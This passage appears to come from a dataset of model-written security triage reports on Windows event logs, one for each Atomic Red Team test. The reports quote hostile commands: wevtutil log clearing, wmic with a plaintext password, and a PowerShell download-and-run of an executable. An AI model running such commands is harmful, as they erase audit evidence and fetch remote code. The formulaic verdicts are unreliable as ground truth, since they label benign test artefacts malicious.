**SUSPICIOUS** - While there are patterns consistent with malicious activity, conclusive evidence confirming a breach isn't available. The activities observed are highly suggestive of compromise, necessitating a more thorough investigation. Consider conducting the following:

- Review and correlate with network logs to check for any anomalous outbound connections.
- Perform a deeper forensic analysis of the system, focusing on any unauthorized access or modification to sensitive files and settings.
- Analyze user behavior and verify the necessity of commands issued under the `admin_test` account.
- Consider network isolation of the system to prevent further unauthorized access or data exfiltration until a thorough investigation is completed.
- Evaluate and strengthen security policies related to logging, user activity monitoring, and service permissions."

Command prompt writing script to file then executes it,"### Detailed Analysis:

Upon reviewing the provided logs, several key points emerge that may indicate potential malicious activity:

1. **Log Clearing Activity:**
   - **EventID 1102** (Security Log) and **EventID 104** (System Log) are present, indicating that the event logs were cleared. This is often a significant indicator of malicious activity as threat actors may clear logs to cover their tracks post-compromise. The user associated with these actions is *admin_test*.

2. **Unusual Use of Wevtutil:**
   - The `wevtutil.exe` utility is used multiple times to clear logs (Sysmon Log). Specifically, commands like `wevtutil cl Microsoft-Windows-Sysmon/Operational`, `wevtutil cl Application`, and `wevtutil cl Security` were executed. This aligns with the log clearance events noted above and indicates an effort to manipulate or obscure event records.

3. **Suspicious Command Line Activity:**
   - A `cmd.exe` process is noted with a complex command line that includes execution of a script `AtomicTest.vbs` which leverages `WScript.Shell`, a method commonly used to execute scripts or commands which may not be benign in a high-integrity context. The direct command used appears obfuscated and may be indicative of a penetration test or an exploitation attempt.

4. **Usage of Administrative Privileges:**
   - Several processes like `wevtutil.exe` operate at high integrity levels, suggesting they have been executed with administrative privileges. This aligns with the user context (*admin_test*), who seems to have performed sensitive operations like log clearance.

Application uninstall using WMIC,"Upon reviewing the provided logs, several indicators and patterns stand out that warrant further discussion, particularly regarding potential malicious activity. Here is a detailed analysis:

1. **Log Clearing Activities:**
   - The **Security log** shows an event indicating that log files were cleared by a user named `admin_test`. This is captured in event ID `1102` in the Security log timestamped `2024-10-22 15:27:58.7310772`.
   - Simultaneously, we observe `Sysmon` logs events where the `wevtutil` command was used several times with the `cl` (clear) command on the `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security` logs. These actions appear coordinated to cover tracks, often a hallmark of malicious activity.
   - The **System log** corroborates this behavior indicating that the `System` and `Windows PowerShell` logs were also cleared.
   - Log clearing, particularly of security and system logs, without obvious cause or business justification, is highly suspicious and a significant indicator of potential malicious activity or an attempt to hide operations conducted on the system.

2. **Unusual Process Executions:**
   - Many `Sysmon` events recorded the execution of `wevtutil.exe`, which correlates with the log clearing events, further supporting potential malicious activity.
   - The execution of `C:\\Windows\\System32\\cmd.exe` with parameters that attempt to uninstall software (`Tightvnc`) is suspicious. This is reflective of a potential attempt to remove remote access tools that could have been illicitly installed.
   
3. **Use of `PowerShell`:** 
   - A `Sysmon` log entry shows `PowerShell.exe` being executed by the `admin_test` user. While this is not inherently suspicious, combined with the other activities (like log clearing), it could indicate script execution aimed at modifying the system or exfiltrating data, which often occurs over PowerShell.

4. **Integrity Level and Privilege Use:**
   - All actions noted are performed under a high integrity level suggesting administrative privileges were used extensively, which aligns with the `admin_test` user account activities.

5. **Software Update and Installation Logs:**
   - The Sysmon log records software update installations related to Microsoft Edge, primarily by the `NT AUTHORITY\\SYSTEM` account. This seems normal for scheduled updates unless correlation with unauthorized changes is found elsewhere.

**Threat or Risk Assessment:**
- These logs depict multiple actions consistent with malicious behavior, especially centered around log clearness and potentially destructive commands or unauthorized software changes.
- The pattern of usage, particularly around the same timestamp, indicates a coherent effort to perform unauthorized activities and prevent detection by clearing logs.

**Conclusion and Guidance:**
- **Resolution: MALICIOUS**
  - The log entries strongly indicate malicious activity on the Windows host, particularly due to the log clearing actions and suspicious process executions, likely pointing to an attempt to cover tracks and persist removal of evidence related to unauthorized access or maintenance activities.

  - Strengthen monitoring and alerting on critical security and system logs to ensure that similar activities are detected promptly in the future."
Cobalt Strike post-exploitation pipe (before 4.2),"Upon analyzing the provided Windows event logs, the following observations and assessments are made:

### Observations:

1. **Event Log Clearing**: 
    - The logs show that various event logs, including System, Windows PowerShell, and Security logs, have been cleared by the user `SERVER002\admin_test`. This is evident from Event ID 104 in the System log and Event ID 1102 in the Security log.

2. **Suspicious Log Clearing Activity**: 
    - Clearing of event logs is typically a sign of malicious activity, as attackers often try to cover their tracks after compromising a system.

3. **Use of Sysmon and Wevtutil**:
    - The Sysmon logs indicate the execution of `wevtutil.exe` with the command to clear logs (e.g., `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`). 
    - The presence of `wevtutil.exe` in logs corresponds with the clearance events, reinforcing the suspicion of intentional log tampering.

4. **PowerShell Activity**:
    - An instance of `powershell.exe` was run by `admin_test`, but the log does not specify the command executed. PowerShell is often used in both benign administrative tasks and malicious activity. Given its association with a user involved in suspicious activity, it is worth noting.

5. **Execution of Suspicious Applications**:
    - The execution of applications such as `namedpipes_server.exe`, `namedpipes_client.exe`, and `namedpipes_executor.exe` located in a temporary directory suggests potential testing or execution of non-standard applications, possibly malicious payloads initiated by the user.

6. **High Integrity Level**:
    - Processes were executed with High integrity, indicating potential administrative privileges during execution, which aligns with actions requiring elevated permissions, such as clearing event logs.

7. **Presence of Scheduled Updates and Services**:
    - Multiple instances of `MicrosoftEdgeUpdate.exe` process executions are visible, which could be standard behavior for Microsoft Edge update processes.

### Assessment:

The combination of clearing key system logs, executing suspicious potential test/malware tools from a temporary directory, and the repetitive use of wevtutil to systematically clear logs are strong indicators of malicious behavior. This type of activity is often associated with post-exploitation actions where attackers attempt to delete traces of their presence and activities on the system. The execution of non-standard binaries further raises suspicion of malicious testing or exploitation.

### Guidance:

- Investigate the system `Server002` for further signs of compromise, focusing particularly on user activities associated with `admin_test`.
- Verify the source and integrity of the suspicious binaries executed from the temporary directory. These should be analyzed for malicious content.
- Examine network logs and connections associated with the IP address noted in the security logs to determine any external connections that could correlate with unauthorized remote access.

Execute PowerShell script via Word DDE,"Based on the provided Windows event logs and the specified task, here's the detailed analysis:

### Analysis:

1. **Clearing of Event Logs (Potential Indicator of Malicious Activity):**
   - **Security Log Cleared:** Event ID 1102 logs indicate that the Security log was cleared at ""2024-10-28 07:38:11.2892325"" by the user ""admin_test"". This is a significant red flag, as log clearing is often associated with attempts to hide malicious activities.
   - **Other Logs Cleared:** The System log (Event ID 104) and Windows PowerShell log (also Event ID 104) were cleared at similar timestamps by user ""admin_test"". This further supports the suspicion of an attempt to cover tracks.

2. **Usage of System Utilities (Potential Indicator of Reconnaissance or Malicious Intent):**
   - **Command ""wevtutil.exe"":** Multiple events indicate the use of `wevtutil.exe`, which is a legitimate Windows tool for managing event logs. However, its use in removing (cl) logs from various channels (Sysmon/Operational, Security, Application, and Windows PowerShell) suggests attempts to manipulate or clear logs programmatically.
   - **Execution of ""cmd.exe"" with Suspicious Command Line:** The command line `/c start ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1559.002\bin\DDE_Document.docx""` indicates the execution of a document potentially related to a penetration testing framework (Atomic Red Team), which could suggest controlled testing or could potentially be a decoy for launching malicious payloads.

3. **Unexpected Processes and Command Lines:**
   - **Execution of ""whoami.exe"" and ""HOSTNAME.EXE"":** While these are legitimate system utilities for querying system and account information, frequent execution in quick succession may point towards reconnaissance actions.
   - **Microsoft Edge Update Activities:** While these could appear routine, the timing coinciding with suspicious events raises concerns about whether legitimate maintenance activities are being mimicked as cover for other actions.
   - Log Clearing and Edge Update installations are not commonly related activities and might suggest an abuse of these services as a cover.

### Conclusion:

- **Identified Risks:** Evidence strongly suggests activities indicative of potential system compromise or malicious attempts to obfuscate actions. The clearing of logs, especially the Security log by a specific user, significantly heightens concern levels.
- **Indicators of Compromise:** Clear deviation from standard workstation activities, especially the execution of utilities with admin privileges to clear logs, coupled with potential testing or exploitation tool usage (`AtomicRedTeam`).

### Resolution:

- **MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected machine(s) from the network to prevent further data loss or lateral movement.
   - Recover the Security and other cleared logs from backup if available for further forensic analysis.

   - Validate the integrity of `MicrosoftEdgeUpdate.exe` and associated files, confirming that they're legitimate and not tampered with or replaced.

3. **Mitigation:**
   - Reinforce security monitoring concerning administrative logins and log clearing activities.
   - Consider implementing stricter role-based access controls to critical logging and auditing functionalities.
  
By addressing these elements promptly, broader network repercussions from this potential compromise can be mitigated."
WMI Execute Local Process,"Upon reviewing the provided Windows event logs, several indicators suggest potentially malicious activity on the host (Server002). Here's a detailed analysis:

### Analysis:

1. **Event Log Clearing:**
   - **Security Log (Event ID 1102):**
     - The Security log has been cleared by the user `admin_test`. This is a standard indicator of suspicious activity as it is common for malicious actors to clear logs to cover their tracks.
   - **System Log (Event ID 104):**
     - The System and Windows PowerShell logs have also been cleared by the user `admin_test`. This further supports the suspicion that malicious activities were intentionally concealed.

2. **Process Execution:**
   - **Sysmon Log (Various Event IDs):**
     - Multiple instances of the `wevtutil.exe` tool are running with the command `cl` to clear different event logs, executed by the `admin_test` user with high integrity level. This is consistent with the log clearing events noted above.
   - **Command Line Execution:**
     - An execution of `cmd.exe` with the command `wmic process call create notepad.exe` is recorded. Although opening Notepad may seem benign, it is executed via WMIC from a command-line process, which is a typical technique used for code execution with potentially malicious intent.

3. **Service and Component Activity:**
   - **Microsoft Edge Installer:**
     - The Sysmon log entries for the Microsoft Edge Installer running with different setup parameters appear consistent with legitimate update activity but should be closely examined in the context of the other suspicious behavior, particularly if this activity was unexpected.

### Threats or Risks Identified:
- The combination of event log clearing, the execution of potentially dangerous commands, and various processes running under an administrative context in a short span signifies unauthorized or malicious activities.
- Clearing logs, especially the security and system logs, strongly indicates attempts to hide actions performed on the system, which is typical in compromise situations.

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected host (Server002) from the network to prevent any further potential malicious activities or lateral movement from occurring.
   - Perform a full forensic investigation on the system to identify any other signs of compromise, such as unexpected file changes, unauthorized user accounts, or other persistence mechanisms.

2. **Further Investigation:**
   - Examine the user account `admin_test` and its activity across other systems if applicable. Determine if the account has been compromised or unauthorized users have gained access.
   - Check for additional artifacts or indicators of compromise not covered by the logs provided, such as malicious software, unexpected network traffic, or suspicious file system changes.

3. **Mitigation and Remediation:**
   - Implement stricter access controls and monitoring on sensitive logs and high-privilege accounts to detect and alert on such activities swiftly.
   - Conduct a comprehensive security review of related security policies to identify weaknesses or gaps exploited during the compromise.

### Conclusion:
**Resolution: MALICIOUS**

The activity observed in the logs is consistent with advanced malicious behavior, specifically targeting event log clearing and suspicious process execution techniques, which indicate an attempted or successful compromise. Immediate action and a thorough investigation are warranted to assess and mitigate the impact."
Potentially Unwanted Applications (PUA),"Upon analyzing the provided Windows event logs, several activities indicate suspicious behavior, suggesting potential malicious activity. Here's a detailed analysis:

### Key Observations

1. **Event Log Clearing:**
   - In the Security and System logs, we observe Event ID 1102 and 104, respectively, which indicate that logs were cleared. The action was performed by a user account ""admin_test."" Clearing of event logs could be an attempt to hide malicious activities.

2. **Unusual PowerShell Activity:**
   - The PowerShell logs show the execution of a command attempting to download a file from `http://amtso.eicar.org/PotentiallyUnwanted.exe` using the `Invoke-WebRequest` command. The file is then executed. This is a potentially malicious action, as downloading and executing files from the internet is a common tactic used by attackers to introduce malware into a system.

3. **Sysmon Entries Suggest Process Execution Related to Potentially Malicious Files:**
   - Several Sysmon logs show the execution of a process with the path `C:\Users\ADMIN_~1\AppData\Local\Temp\PotentiallyUnwanted.exe`. This aligns with the activity seen in the PowerShell logs, suggesting successful download and execution of the potentially unwanted or malicious executable.

### Assessment and Resolution

- The clearing of event logs is a strong indicator of an attempt to cover tracks, which is a characteristic behavior of malicious activity.
- The PowerShell log showing the download and execution of a potentially suspicious executable from a non-trusted source is a critical indicator of potential compromise.
- Sysmon logs confirm the execution of the suspicious executable that was downloaded, further reinforcing malicious intent.

Based on these observations, there is compelling evidence to classify the activities recorded in the logs as **MALICIOUS** activity.

### Recommended Actions

1. **Immediate Isolation:**
   - Isolate the affected host from the network to prevent further spread or data exfiltration.

2. **In-Depth Forensic Analysis:**
   - Conduct a thorough forensic investigation to uncover any additional indicators of compromise and understand the full scope of the breach.

3. **Review and Harden Security Configurations:**
   - Review user account activities and permissions, especially for `admin_test`.
   - Enhance monitoring and logging to detect similar incidents in real-time.

4. **Update Security Software:**
   - Ensure that all antivirus and endpoint protection solutions are updated to detect and mitigate this and similar threats.

5. **Cleanup and Recovery:**
   - Remove any unauthorized executables and scripts, ensuring the system is clean before it is reinstated into the network.

By adopting these measures promptly, you can mitigate the risk and limit the potential impact of the detected malicious activity."
ESXi - Install a custom VIB on an ESXi host,"Upon analyzing the provided Windows event logs, here is the detailed analysis:

### System Log Analysis
1. **Event ID 104 (LogFileCleared)**: The system logs indicate multiple log clear events for the System, Windows PowerShell, and, significantly, the Security channels. This is performed by the user ""admin_test"". Clearing logs, especially security logs, is often considered an indicator of malicious activity as intruders frequently clear logs to cover their tracks.

### Application Log Analysis
1. **Edge Update Service**: The events involving the `edgeupdate` suggest normal operations related to the Microsoft Edge update. Services being started and stopped are part of routine behavior.

### Sysmon Log Analysis
1. **PowerShell Execution (Event ID 1, 5)**: The execution of `powershell.exe` marked with high integrity level by `SERVER002\admin_test` with no accompanying command-line details can be suspicious if not accounted for by a legitimate administrator task.
2. **wevtutil.exe**: The `wevtutil.exe cl` command used by `SERVER002\admin_test` across different logs (Security, System, and Windows PowerShell). Similar to Event ID 104 in the system log, clearing logs using this command is highly suspicious, especially when performed across critical logs.
3. **Atomic Red Team Activity**: There is evidence of known penetration testing tools being used - `pscp.exe` and `plink.exe`, located in temporary directories associated with Atomic Red Team testing. The command involves remote execution and file transfer using default credentials, which might indicate either a simulated attack (in controlled scenarios) or unauthorized activities.

### Security Log Analysis
1. **Log File Clearing (Event ID 1102)**: As in the system log, the security log clearing by `SERVER002\admin_test` is performed.
2. **Privileged Logons (Event IDs 4624, 4672)**: The system shows multiple logon events for the SYSTEM context with elevated privileges, which is typical during system operations, but can be used for privilege escalation by attackers.
3. **Credential Access (Event ID 5379)**: There are multiple credential validation failures related to a Microsoft Account, which may indicate attempts to access or misuse credentials.
4. **User Enumeration (Event ID 4798)**: Occurs when an account management tool queries for a list of users in the system, indicative of reconnaissance activity, often performed before an attack.

### Conclusion
There are strong indicators of potentially malicious activity within these logs:
- The systematic clearing of event logs (System, Security, PowerShell) indicates an attempt to erase tracks often associated with an unauthorized or malicious user.
- The presence of scripts/tools typically used by red teams such as Atomic Red Team suggests possible penetration testing, but their misuse in an unapproved context can be malicious.
- Credential validation failures and user enumeration suggest attempts at unauthorized access or reconnaissance.

### Assessment: MALICIOUS

### Guidance
1. **Immediate Response**: Perform a forensic investigation on `Server002` to gather evidence and assess the scope of breach.
2. **User Account Activity**: Review recent activities and configurations, particularly focusing on the `admin_test` account.
3. **Security Controls**: Enhance monitoring on administrative activities, and set up alerts for log clearing and use of known penetration testing tools.
4. **Credential Security**: Investigate failed credential attempts and ensure strong credentials and two-factor authentication are enforced.

This scenario outlines clear signs of malicious intent, warranting an urgent security response to mitigate potential threats and vulnerabilities."
WMI Execute Remote Process,"Analyzing the provided Windows event logs, the following suspicious activities have been identified:

1. **Log Clearing Activity**:
   - Multiple log clearing activities are observed within a very short timeframe:
     - **Security Log Cleared** (Event ID 1102) at 15:13:08.
     - **System Log Cleared** (Event ID 104) at 15:13:08.
     - **Windows PowerShell Log Cleared** (Event ID 104) at 15:13:08.
   - The actions are performed by the user `admin_test` and involve the use of `wevtutil.exe` command, which is a legitimate utility used for managing Windows event logs, but its use to clear logs is often associated with attempts to hide malicious activities.

2. **Time Change Events**:
   - There are events indicating a system time modification (Event ID 4616), which can be indicative of an attempt to manipulate timestamps to confuse logging and monitoring.

3. **Failed Logon Attempts**:
   - There are multiple failed logon attempts (Event ID 4625) using the account `Administrator` with a password:
     - These events indicate an attempted brute-force attack or a misconfiguration where incorrect credentials are being used to authenticate.

4. **Privilege Assignments**:
   - The user `admin_test` is assigned high-level privileges (Event ID 4672) including `SeDebugPrivilege`, `SeSecurityPrivilege` among others. These privileges are sensitive and may suggest attempts at privilege escalation or preparation for further malicious activities.

5. **Unusual Command Execution**:
   - Execution of `cmd.exe` with WMI command for process creation:
     - `cmd.exe /c wmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:""127.0.0.1"" process call create notepad.exe`
   - Such use of WMIC to execute processes on localhost could be indicative of testing or malicious attempts to execute commands remotely or obscurely.

6. **Multiple Instance of Process Execution**:
   - Processes like `wevtutil.exe`, `cmd.exe`, and `WMIC.exe` with the above command lines appeared numerous times within seconds, further implying potential automation in the execution often seen in scripted attacks.

### Assessment and Conclusion:

The above findings present strong indicators of malicious activity, given the sequence of actions aimed at hiding evidence through log clearance, the peculiar failed logon attempts, and high-status privileges being granted. While each of these individually may have benign explanations, collectively, they strongly suggest attempted obfuscation and privilege escalation.

### Recommendation:

1. Immediately isolate the machine `Server002` from the network to prevent further potential exfiltration or lateral movement.
2. Conduct a full forensic analysis to determine the extent of compromise.
3. Review security policies and enforce strong password policies and least privilege principles.
4. Ensure centralized logging is configured to capture and retain logs outside of the compromised host.

### Resolution:

**MALICIOUS** - The logs contain activity that indicates malicious intent and comprises of the system with high certainty."
NTFS Alternate Data Stream Access,"Based on the analysis of the provided logs, there are multiple indicators of suspicious and potentially malicious activity. Here is a detailed analysis:

1. **Suspicious Activity from `wevtutil.exe`:**
   - There are multiple instances of `wevtutil.exe` being executed with commands to clear several event logs (`Security`, `System`, `Application`, and `Windows PowerShell` logs). This action is generally suspicious, especially when done by a normal user account like `admin_test` (S-1-5-21-3962163828-2803415714-1403596700-1006).
   - Clearing event logs is a common tactic used by attackers post-compromise to remove traces of their actions.

2. **Execution of Obfuscated PowerShell Script:**
   - The PowerShell command executed appears to use NTFS alternate data streams (ADS) to store and read commands, which is often used to hide malicious scripts. The sequence involves commands to use `Add-Content` and `Get-Content` with `Invoke-Expression`, which is a method commonly used in PowerShell obfuscation techniques.
   - These activities indicate a potential execution of malicious code which is being obfuscated to avoid detection by utilizing legitimate Windows features.

3. **Event Log Clearing:**
   - Event ID 1102 from the Security log indicates the security log was cleared, and similar entries in the System log indicate logs were cleared as well. This action is associated with malicious activity, particularly to hide traces.

4. **Behavior Patterns:**
   - The combination of clearing logs and running obfuscated PowerShell indicates a pattern of behavior consistent with post-exploitation activities where the attacker is attempting to hide their tracks and maintain persistence on the system.

5. **Privilege Elevation:**
   - The user `admin_test` had elevated privileges (Event ID 4672) with access to sensitive system operations (SeDebugPrivilege, SeSystemEnvironmentPrivilege, etc.), indicating they could perform actions with high impact on the system.

Based on the identified patterns, the logs strongly suggest malicious activity. Therefore, the resolution of these findings is classified as:

**MALICIOUS**

**Recommended Actions:**
- Immediate containment of the affected host to prevent further damage or data exfiltration.
- Conduct a forensic investigation to determine how the initial compromise occurred and the extent of the breach.
- Review other systems for similar indicators to check for lateral movement.
- Examine user activity logs and implement stricter access controls and monitoring for the `admin_test` user account.
- Restore logs from backups if available, and analyze them for indicators of compromise.
- Consider a complete system rebuild or restoration from a known safe backup, depending on the investigation results."
Suspicious Execution via Windows Command Shell,"Upon reviewing the provided Windows event logs, it is apparent that there are several activities of interest. Here's a breakdown of the key events and their implications:

1. **Wevtutil.exe Activities**:
   - The execution of ""wevtutil.exe"" is consistent across multiple instances, indicating commands were run to clear logs such as Application, System, and Security logs (""cl"" command in the command line). 
   - This tool is legitimate and part of Windows, used to manage event logs. However, its frequent usage to ""clear"" logs can be suspicious as it may indicate an attempt to obscure activities or cover tracks, a common tactic post-exploitation or network intrusion.

2. **Log Clearing Events**:
   - Security log event (ID 1102) shows the clearing of security logs by ""admin_test"". 
   - System log events (ID 104) also indicate the clearing of System and Windows PowerShell logs.
   - These actions collectively point towards an act of log manipulation, likely aimed at hiding malicious activities.

3. **Cmd.exe Usage**:
   - There is a command executed via ""cmd.exe"" which involves an echo operation that outputs text to a file named ""hello.txt"". While this command, in isolation, doesn't cause concern, its execution shortly after log clearing actions and originating from the same user (SERVER002\admin_test) may imply testing or probing as part of malicious activity.

4. **Microsoft Edge Update**:
   - There are frequent ""MicrosoftEdgeUpdate.exe"" activities, which generally could be benign system updates. However, given their proximity to potentially malicious activities, there should be an additional check to ensure these are legitimate updates and not masquerading processes.

5. **Potentially Obfuscating Command**:
   - The use of substrings and batch commands in the context of cmd.exe like ""%%LOCALAPPDATA:~-3,1%%md"" seems unusual and may be indicative of obfuscation techniques often used to execute commands without direct visibility.

**Assessment**:
- **Resolution**: SUSPICIOUS
  - The presence of log clearing activities initiated by a user shortly followed by normal and some atypical usage of system binaries like wevtutil and cmd suggests a need for further investigation. Though there are no overt signs of payload execution or privilege escalation, the intent behind these actions merits a deeper security review.

**Guidance on How to Proceed**:
- Initiate a thorough investigation to track any anomalous behaviors or traces left in other logs or system artifacts not covered by these event logs.
- Examine other hosts for similar activities initiated under the same user account or pattern.
- Verify the legitimacy of Microsoft Edge Update processes for potential anomalies.
- Audit ""admin_test"" user account for unauthorized access and implement additional monitoring or access controls if necessary.
- Consider implementing the use of more robust logging mechanisms to detect and alert on log manipulation attempts and associated activities."
SOAPHound - Build Cache,"Upon review of the event logs, several indicators of potentially malicious activity were identified:

1. **Clearing Event Logs**: 
   - Multiple instances where logs were cleared (Event ID 104) for system and PowerShell channels by the user `admin_test`. Clearing logs is a known evasion tactic used by malicious actors to cover their tracks.

2. **Suspicious PowerShell Command**:
   - The execution of a PowerShell command (`powershell.exe`) with the script `SOAPHound.exe` from `AtomicRedTeam` folder which indicates potential testing of malicious capabilities or simulation of an attack. The command included credentials (`--user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1`), which is atypical for everyday administrative tasks.

3. **Security Log Cleared**: 
   - Security Event ID 1102 indicates the security log was cleared, which is a common indicator of someone trying to hide their actions after potentially malicious activity.

4. **Credential Exposure**:
   - The PowerShell event log records show the exposure of plaintext password `P@ssword1`, which signifies a severe security risk and potential compromise.

5. **Use of `Wevtutil`**:
   - Frequent use of `wevtutil.exe` to clear logs (`cl` command for System, Security, Windows PowerShell) by `admin_test` suggests a methodical approach to log clearance.

Based on these activities:

- **Suspicious Nature**: The events imply activities commonly associated with security breaches and intrusion tactics, such as an attempt to erase forensic evidence and password exposure for potentially lateral movements.
  
- **Malicious Indicators**: Considering the deliberate action of clearing logs and executing a PowerShell script from a possibly penetration-testing suite with exposed credentials, these actions point more towards a controlled test or an attack simulation rather than routine administrative tasks.

Given these findings, the resolution is categorized as:
- **MALICIOUS** - The logs contain activities consistent with intentional malicious behavior, such as clearing logs and password handling that poses a risk to security.

### Guidance:
1. **Immediate Review and Response**: Initiate an immediate review of user `admin_test` and check access logs for any unauthorized access.
2. **Mitigate Password Exposure**: Change any passwords transmitted during the PowerShell execution and assess accounts for unauthorized activities.
3. **Forensic Analysis**: Conduct a comprehensive forensic investigation to confirm the extent and impact of the potential breach.
4. **Strengthen Logging and Alerts**: Ensure logging security to prevent unauthorized clearance and setup alerts for similar activities in the future.
5. **Awareness and Training**: Provide training to recognize and prevent the use of dangerous PowerShell scripts and the importance of securing administrative credentials. Implement proper security measures and tools to ensure any test scenarios are conducted within a safe environment."
JScript execution to gather local computer information via wscript,"### Analysis

Upon reviewing the provided Windows event logs, several points of interest were identified:

1. **Event Log Clearing:**
   - Event ID 1102 in the Security log indicates that ""admin_test"" cleared the security logs at ""2024-10-23 12:38:20.3240291"". This can be suspicious behavior as clearing logs might be an attempt to cover tracks after unauthorized access or other malicious activity.

2. **Repeated Privilege Assignments:**
   - Multiple Event ID 4672 logs indicate that a user with SYSTEM privileges is repeatedly being assigned a large number of high-level privileges. While SYSTEM is expected to have these privileges, the number of times these assignments occur in rapid succession could suggest abuse.

3. **Unusual PowerShell Activity:**
   - Multiple instances of PowerShell (Event ID 600 in the PowerShell log, Event ID 1 in Sysmon log) initiated with specific scripts are noted, which require attention due to their potential use in executing malicious scripts.

4. **Suspicious Parent-Child Process Relationships:**
   - There are events involving the ""CompatTelRunner.exe"" and taskhostw.exe processes that suggest scripts being run. CompatTelRunner.exe is a legitimate Windows telemetry tool, but its use here with PowerShell scripts is unusual and needs further scrutiny.

5. **Multiple Installations and Executions:**
   - There are numerous sysmon logs capturing Microsoft Edge update and setups (various Event ID 1 logs), which could be benign but require validation to ensure no modifications have been made to carry malicious payloads.

6. **Network Activities and Possible Lateral Movement:**
   - Event ID 4624 logs show multiple logons using SYSTEM authority with IP address association detailing logs which need to be confirmed legitimate.

### Assessment

Given the log evidence, the behavior appears suspicious. The clearing of security logs is a strong indicator of potential compromise, and, while some activities could belong to legitimate operations, the timeline and nature of activity suggest the possibility of malicious intent.

### Resolution

**SUSPICIOUS** - The logs contain activities that don't look right and need more investigation. The log clearing by ""admin_test"", repeated high-level privilege assignments, and unusual PowerShell activity warrant a deeper forensic review to confirm or rule out a security incident.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Ensure that the ""admin_test"" account is audited and verify if the recent activities are justified.
   - Check configurations and access for ""admin_test"" and similar admin accounts for any unusual activity or access the device during the time in question.
   - Network logon events should be cross-checked with legitimate administrative access.

2. **Forensic Analysis:**
   - Perform a deeper dive into the PowerShell logs to decode any scripts executed.
   - Review Sysmon logs for suspicious child processes, particularly those launched by legitimate applications.

3. **Monitor and Plan:**
   - Increase monitoring to detect if similar behavior surfaces.
   - If determined malicious and originating from external sources, consider a plan for Incident Response that includes isolating affected systems. 

4. **Review Security Policies:**
   - Revise security policies to ensure log retention and visibility.
   - Implement tighter controls on administrative actions, particularly those that can clear logs or mask activities.

A comprehensive investigation and validation by a cybersecurity professional are necessary to follow up effectively on these findings."
Create and Execute Batch Script,"Upon reviewing the provided Windows event logs, several indicators and patterns of activity could be observed. The analysis is based on the event logs from various categories, namely System, Windows PowerShell, Application, Security, and Sysmon logs.

### Summary of Log Findings

1. **Clear All Event Logs Command:**
   - The System log and Security log show usage of `wevtutil` to clear logs (EventID 104 and 1102 respectively). This action was performed by a user `admin_test`, which is highly suspicious. Attackers often clear logs to hide their activity.
   
2. **Execution of Suspicious PowerShell Script:**
   - The Windows PowerShell logs indicate execution of `powershell.exe` with a script located in `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\T1059.003_script.bat`. This path is suspicious and atomic testing scripts (often used for testing Red Team activities) that involve running batch files can be indicative of potentially harmful scripts or penetration testing activities.

3. **Process Creation Linked to Potential Malicious Activity:**
   - The Sysmon logs show bundled use of `powershell.exe` and command-line execution of a batch script. The chain of commands involving `whoami.exe` and `hostname.exe` suggests reconnaissance activities which may be used to enumerate system information.
   - Frequent invocation of `conhost.exe`, often linked with PowerShell or `cmd.exe`, suggests command-line activity which might mask the execution of unauthorized or unmonitored tasks.

### Indicators of Potential Malicious Activity

- **Log Clearing Events:** The command `wevtutil.exe cl` is used multiple times across logs, suggesting an attempt to hide actions.
- **Execution of PowerShell with Scripts from Temporary Directories:** Usage of temporary directories and external payloads is atypical and suggests possibly malicious or unauthorized testing activity (often seen with penetration tests representing real-world attack simulations).

### Final Assessment and Recommendations

- **Resolution: MALICIOUS**

There is substantial evidence to suspect that the activity observed in the logs is malicious in nature. The combination of log clearing, suspicious batch script execution via PowerShell, and detailed command-line instructions typically suggest unauthorized or potentially harmful testing activities undergoing on the system.
  
**Recommendations:**
- Confirm whether the events correlate with scheduled penetration testing or authorized Red Team activities. If unauthorized, initiate incident response actions.
- Investigate the user `admin_test` to verify if the account was compromised.
- Implement stricter monitoring and alerting on the use of `wevtutil`, PowerShell activities, and execution of scripts from temporary directories.
- If deemed necessary, isolate the affected system for a deeper forensic analysis."
Execution through API - CreateProcess,"Upon reviewing the provided Windows event logs, there are several indicators of suspicious and potentially malicious activity. Here’s a detailed breakdown:

### Key Points of Suspicious Activity:

1. **Log Clearing Activity:**
   - Events in the System log indicate that logs for multiple channels (System, Windows PowerShell, and Security) were cleared consecutively around the same timestamp (""2024-10-24 12:41:03"").
   - Event IDs like 104 in the System log and 1102 in the Security log suggest that the log clearing was executed by the user ""admin_test"". This aligns with the process execution details in the Sysmon log, which also shows repeated usage of `wevtutil.exe` for clearing logs.

2. **Presence of Command Line Activity:**
   - The Sysmon log shows several executions of `cmd.exe` with complex command lines, including suspicious file compilation (`csc.exe`) and execution from what appears to be a temp or arbitrary directory path. This kind of activity is often associated with stealthy software installation or execution.
   - A specific command line `/c calc.exe` executed from `cmd.exe` is noticeable. While `calc.exe` itself is benign, its execution path hints towards potential testing of commands or scripted automation.

3. **Use of `wevtutil.exe`:**
   - This utility is being used to clear various event logs including System, Security, and PowerShell. Clearing logs is often performed to cover tracks of unauthorized or malicious actions.

4. **Execution of `T1106.exe` from Temp Directory:**
   - `T1106.exe` is executed from a temporary directory, suggesting it may be part of a test (potentially linked with Atomic Red Team, which is often used to simulate adversary attacks for testing purposes).

5. **Unusual Process Creation:**
   - Analysis of the `ProcessGuid` links a series of processes which in aggregate indicate potentially orchestrated activities that are chained together, including process creation of cmd and subsequently compilation processes (`csc.exe`) which deviate from routine operations.

### Assessment:

The combination of event log clearing, unusual command-line executions, and creation/execution of temporary files with potentially executable code, plus the context of these being associated with atomic test-like indicators (e.g., `T1106`) leads us to a concerning assessment. This aligns closely with known tactics of adversaries who clean log files to evade detection, create executable files to establish persistence, or carry out other malicious intents such as privilege escalation or lateral movement.

**Final Resolution: MALICIOUS**

### Recommendations:

1. **Immediate Incident Response:**
   - Initiate a thorough forensic investigation to determine the extent of compromise, review other systems for similar activities, and identify any potential data exfiltration or modification.
   
2. **User Credential Review:**
   - Review access and privileges for the user ""admin_test"". Consider password reset and enhanced monitoring for potentially compromised credentials.
   
3. **Enhance Log Monitoring:**
